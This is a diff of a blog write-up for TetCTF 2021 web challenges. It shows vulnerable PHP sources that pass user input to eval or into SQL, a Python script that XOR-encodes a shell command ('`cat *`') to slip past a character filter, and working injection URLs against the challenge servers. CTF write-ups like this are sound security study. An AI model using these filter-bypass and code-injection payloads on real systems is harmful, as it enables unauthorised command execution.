@@ -2,7 +2,7 @@
 title: "CTF - TetCTF 2021"
 categories: [ctf]
 date: 2021-01-03
-hasComments: true
+comments: true
 image: /images/writeups/TetCTF2021/tet_logo.png
 description: CTF - TetCTF 2021
 ---
@@ -39,25 +39,25 @@ http://139.180.155.171/?calc=(1.2-0.2)*5.1
 From the previous example I tried to remove the calc parameter and the PHP code showed up:
 
 {% highlight php %}
-	<!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->
+<!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->
 
-	<?php
+<?php
 
-	ini_set("display_errors", 0);
+ini_set("display_errors", 0);
 
-	if(!isset($_GET["calc"])) 
-	{
-	    show_source(__FILE__);
-	}
-	else
-	{
-	    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
-	    if($wl === 0 || strlen($_GET["calc"]) > 70) {
-	        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
-	    }
-	    echo 'Result: ';
-	    eval("echo ".eval("return ".$_GET["calc"].";").";");
-	}
+if(!isset($_GET["calc"])) 
+{
+    show_source(__FILE__);
+}
+else
+{
+    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
+    if($wl === 0 || strlen($_GET["calc"]) > 70) {
+        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
+    }
+    echo 'Result: ';
+    eval("echo ".eval("return ".$_GET["calc"].";").";");
+}
 {% endhighlight %}
 
 We have a regex which reject all the strings with letters and other symbols different than the ones on the expresion, so we are limited to use numbers and those symbols. Looking for something like that at Google I found [this writeup](https://www.programmersought.com/article/7881105401/) which uses non-alphanumeric strings and XOR operations to bypass the filter.
@@ -80,17 +80,17 @@ Now into the most challenging part. How do we know the values we have to XOR to 
 
 {% highlight python %}
 
-	from itertools import combinations_with_replacement
-	import json
+from itertools import combinations_with_replacement
+import json
 
-	val_chars = "0123456789+-*/()~^|&."
-	comb = combinations_with_replacement(val_chars, 2)
+val_chars = "0123456789+-*/()~^|&."
+comb = combinations_with_replacement(val_chars, 2)
 
-	all_combs = {}
-	for i in list(comb):
-		key = chr(ord(i[0]) ^ ord(i[1]))
-		all_combs[key] = i
-	print(json.dumps(all_combs, indent=4))
+all_combs = {}
+for i in list(comb):
+	key = chr(ord(i[0]) ^ ord(i[1]))
+	all_combs[key] = i
+print(json.dumps(all_combs, indent=4))
 
 {% endhighlight %}
 
@@ -136,52 +136,52 @@ Using this concept I developed a small script to decompose every ASCII char into
 
 {% highlight python %}
 
-	from itertools import combinations_with_replacement
-	import json
+from itertools import combinations_with_replacement
+import json
 
-	valid_chars = "0123456789+-*/()~^|&."
-	combs = combinations_with_replacement(valid_chars, 2)
-	target_string = '`cat *`'
+valid_chars = "0123456789+-*/()~^|&."
+combs = combinations_with_replacement(valid_chars, 2)
+target_string = '`cat *`'
 
-	simple_chars = {}
-	# Generate and store all possible combinations
-	for i in list(combs):
-		key = chr(ord(i[0]) ^ ord(i[1]))
-		simple_chars[key] = i
-	#print(json.dumps(simple_chars, indent=4))
-
-
-	# Merge all posible characters into a list and 
-	valid_generated_chars = ''.join(simple_chars.keys()) + valid_chars
-	complex_combinations = combinations_with_replacement(valid_generated_chars, 2)
-
-	complex_chars = {}
-	# Generate and store all possible complex combinations
-	for i in list(complex_combinations):
-		key = chr(ord(i[0]) ^ ord(i[1]))
-		complex_chars[key] = i
-	#print(json.dumps(complex_chars, indent=4))
+simple_chars = {}
+# Generate and store all possible combinations
+for i in list(combs):
+	key = chr(ord(i[0]) ^ ord(i[1]))
+	simple_chars[key] = i
+#print(json.dumps(simple_chars, indent=4))
 
 
-	for c in target_string:
+# Merge all posible characters into a list and 
+valid_generated_chars = ''.join(simple_chars.keys()) + valid_chars
+complex_combinations = combinations_with_replacement(valid_generated_chars, 2)
 
-		if c in simple_chars:
-			print("{}: ('{}'^'{}')".format(c, simple_chars[c][0], simple_chars[c][1]))
-		
-		elif c in complex_chars:
-			# If the character is complex, decompose it using only valid charset
-			op1 = "'{}'".format(complex_chars[c][0])
-			op2 = "'{}'".format(complex_chars[c][1])
-			try:
-				op1 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][0]])
-			except:
-				pass
-			try:
-				op2 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][1]])
-			except:
-				pass
+complex_chars = {}
+# Generate and store all possible complex combinations
+for i in list(complex_combinations):
+	key = chr(ord(i[0]) ^ ord(i[1]))
+	complex_chars[key] = i
+#print(json.dumps(complex_chars, indent=4))
 
-			print("{}:: ({}^{})".format(c, op1, op2))
+
+for c in target_string:
+
+	if c in simple_chars:
+		print("{}: ('{}'^'{}')".format(c, simple_chars[c][0], simple_chars[c][1]))
+	
+	elif c in complex_chars:
+		# If the character is complex, decompose it using only valid charset
+		op1 = "'{}'".format(complex_chars[c][0])
+		op2 = "'{}'".format(complex_chars[c][1])
+		try:
+			op1 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][0]])
+		except:
+			pass
+		try:
+			op2 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][1]])
+		except:
+			pass
+
+		print("{}:: ({}^{})".format(c, op1, op2))
 
 {% endhighlight %}
 
@@ -200,21 +200,21 @@ t: ('*'^'^')
 ('|'^'.'^'2').('|'^'.'^'1').('|'^'.'^'3').('*'^'^').('~'^'^').('^'^'.'^'|'^'&').('|'^'.'^'2')
 ```
 
-Concatenating that output leads into a 93 chars string, which will be refused by the length condition. We can merge adjacent XOR operations with the same number of operators and also use the '\*\' as it is since is accepted by the regex. Knowing that, we end up with this expresion:
+Concatenating that output leads into a 93 chars string, which will be refused by the length condition. We can merge adjacent XOR operations with the same number of operators and also use the \'\*\' as it is since is accepted by the regex. Knowing that, we end up with this expresion:
 
-```
 If you use all XOR operations, encode the & symbol since the server will interpret it as a new parameter.
 
+```
 ('|||'^'...'^'213').('*~'^'^^').('^'^'.'^'|'^'%26').('|'^'.'^'2')
 
 ('|||'^'...'^'213').('*~'^'^^').'*'.('|'^'.'^'2')
 
-view-source:http://139.180.155.171/?calc=(%27|||%27^%27...%27^%27213%27).(%27*~%27^%27^^%27).%27*%27.(%27|%27^%27.%27^%272%27)
+http://139.180.155.171/?calc=(%27|||%27^%27...%27^%27213%27).(%27*~%27^%27^^%27).%27*%27.(%27|%27^%27.%27^%272%27)
 
 ```
 
 <p align="center">
-  <img src="/images/writeups/TetCTF2021/1_flag.png" width="500"/>
+  <img src="/images/writeups/TetCTF2021/1_flag.png" width="700"/>
 </p>
 	
 
@@ -234,35 +234,37 @@ The website has the following code:
 
 {% highlight php %}
 
-	<!-- Let's pray for new year lucky things <3 -->
+<!-- Let's pray for new year lucky things <3 -->
 
-	<?php
+<?php
 
-	function get_lucky_word() {
-	    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
-	    return $words[array_rand($words)];
-	}
+function get_lucky_word() {
+    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", 
+    "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", 
+    "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
+    return $words[array_rand($words)];
+}
 
-	function get_lucky_number() {
-	    $numb = rand(0,100);
-	    return strval($numb);
-	}
+function get_lucky_number() {
+    $numb = rand(0,100);
+    return strval($numb);
+}
 
 
-	if(!isset($_GET["roll"])) {
-	    show_source(__FILE__);
-	}
-	else
-	{
-	    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);
+if(!isset($_GET["roll"])) {
+    show_source(__FILE__);
+}
+else
+{
+    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);
 
-	    if($wl === 0 || strlen($_GET["roll"]) > 50) {
-	        die("bumbadum badum");
-	    }
-	    eval("echo ".$_GET["roll"]."();");
-	}
+    if($wl === 0 || strlen($_GET["roll"]) > 50) {
+        die("bumbadum badum");
+    }
+    eval("echo ".$_GET["roll"]."();");
+}
 
-	?>
+?>
 
 {% endhighlight %} 
 
@@ -283,7 +285,7 @@ http://192.46.227.32/?roll=var_dump(get_defined_functions())
 Now, we can use some of the functions to retrieve information from the web directory:
 var_dump(scandir(getcwd()))
 
-scandir(__DIR__) == scandir(getcwd())
+scandir(\_\_DIR\_\_) == scandir(getcwd())
 
 ```
 http://192.46.227.32/?roll=var_dump(scandir(getcwd()))
@@ -325,45 +327,45 @@ Limit 'Em All! http://45.77.255.164/
 This challenge have the following PHP code with a database:
 
 {% highlight php %}
-	<!-- The Author of this challenge is so kind and handsome that he is giving you flag, just need to bypass his god-tier waf and grab it <3 -->
+<!-- The Author of this challenge is so kind and handsome that he is giving you flag, just need to bypass his god-tier waf and grab it <3 -->
 
-	<?php 
+<?php 
 
-	include('dbconnect.php');
+include('dbconnect.php');
 
-	if(!isset($_GET["id"]))
-	{
-	    show_source(__FILE__);
-	}
-	else
-	{
-	    // filter all what i found on internet.... dunno why ｡ﾟ･（>﹏<）･ﾟ｡
-	    if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) 
-	    {
-	        die('<img src="https://i.imgur.com/C42ET4u.gif" />'); 
-	    }
-	    else
-	    {
-	        // prevent sql injection
-	        $id = mysqli_real_escape_string($conn, $_GET["id"]);
+if(!isset($_GET["id"]))
+{
+    show_source(__FILE__);
+}
+else
+{
+    // filter all what i found on internet.... dunno why ｡ﾟ･（>﹏<）･ﾟ｡
+    if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) 
+    {
+        die('<img src="https://i.imgur.com/C42ET4u.gif" />'); 
+    }
+    else
+    {
+        // prevent sql injection
+        $id = mysqli_real_escape_string($conn, $_GET["id"]);
 
-	        $query = "select * from flag_here_hihi where id=".$id;
-	        $run_query = mysqli_query($conn,$query);
+        $query = "select * from flag_here_hihi where id=".$id;
+        $run_query = mysqli_query($conn,$query);
 
-	        if(!$run_query) {
-	            echo mysqli_error($conn);
-	        }
-	        else
-	        {    
-	            // I'm kidding, just the name of flag, not flag :(
-	            echo '<br>';
-	            $res = $run_query->fetch_array()[1];
-	            echo $res; 
-	        }
-	    }
-	}
+        if(!$run_query) {
+            echo mysqli_error($conn);
+        }
+        else
+        {    
+            // I'm kidding, just the name of flag, not flag :(
+            echo '<br>';
+            $res = $run_query->fetch_array()[1];
+            echo $res; 
+        }
+    }
+}
 
-	?>
+?>
 {% endhighlight %}
 
 
